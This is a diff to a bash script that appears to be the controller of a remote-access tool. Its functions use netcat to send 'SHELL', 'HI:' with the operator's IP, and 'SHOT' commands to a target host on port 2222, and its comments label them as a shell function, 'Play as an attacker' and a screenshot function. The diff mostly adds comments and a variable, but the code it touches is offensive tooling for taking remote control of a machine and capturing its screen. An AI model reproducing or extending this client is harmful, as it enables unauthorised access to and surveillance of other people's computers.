@@ -26,6 +26,7 @@ FILE=""
 ACK=""
 PROMPT="\e[3;1m[n00b]$ "  # <- Insert your name here
 ONOFF=""
+CMD=""
 #
 
 usage(){
@@ -138,13 +139,14 @@ check_ack(){
     sleep 0.3
     if [ -z "$ACK" ]; then
       echo "[-] ACK not received! Check the endpoint."
-
       false
-    fi
 
+    fi
+    # If everything is allright
     true
 }
 
+# The shell function
 shell(){
       nc "$TARGET" 2222 <<< "SHELL"
 
@@ -165,6 +167,7 @@ shell(){
       fi
 }
 
+# Play as an attacker
 as_a_client(){
     nc "$TARGET" 2222 <<< "HI:$MYIP"
     if check_ack
@@ -178,6 +181,7 @@ as_a_client(){
 
 }
 
+# Screenshot function
 take_screenshot(){
     nc "$TARGET" 2222 <<< "SHOT"
 
